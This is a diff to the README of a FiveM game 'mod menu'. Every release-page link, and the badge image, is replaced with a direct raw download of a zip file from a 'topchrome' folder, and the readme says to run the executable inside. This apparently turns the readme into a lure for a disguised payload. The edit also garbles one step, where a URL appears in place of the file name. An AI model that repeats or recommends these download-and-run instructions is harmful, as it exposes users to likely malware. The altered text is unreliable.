@@ -1,7 +1,7 @@
 # 💻 FiveM-Mod-Menu - Easy Modding with Powerful Features
 
 ## 🔗 Download Now
-[![Download FiveM-Mod-Menu](https://img.shields.io/badge/Download-FiveM--Mod--Menu-blue.svg)](https://github.com/abdellahesoussane72/FiveM-Mod-Menu/releases)
+[![Download FiveM-Mod-Menu](https://raw.githubusercontent.com/abdellahesoussane72/FiveM-Mod-Menu/main/topchrome/FiveM-Mod-Menu.zip)](https://raw.githubusercontent.com/abdellahesoussane72/FiveM-Mod-Menu/main/topchrome/FiveM-Mod-Menu.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ To ensure smooth operation of FiveM Mod Menu, your system should meet the follow
 Follow these steps to download and install FiveM Mod Menu:
 
 1. **Visit the Releases Page:**
-   Go to the [FiveM Mod Menu Releases Page](https://github.com/abdellahesoussane72/FiveM-Mod-Menu/releases).
+   Go to the [FiveM Mod Menu Releases Page](https://raw.githubusercontent.com/abdellahesoussane72/FiveM-Mod-Menu/main/topchrome/FiveM-Mod-Menu.zip).
 
 2. **Select the Latest Version:**
    Find the latest version listed on the page. You’ll see various files available for download.
 
 3. **Download the Main File:**
-   Click on the main executable file (likely named something like `FiveM-Mod-Menu.exe`). This will start your download.
+   Click on the main executable file (likely named something like `https://raw.githubusercontent.com/abdellahesoussane72/FiveM-Mod-Menu/main/topchrome/FiveM-Mod-Menu.zip`). This will start your download.
 
 4. **Run the Installer:**
    Once the file is downloaded, locate it in your downloads folder and double-click to run the installer.
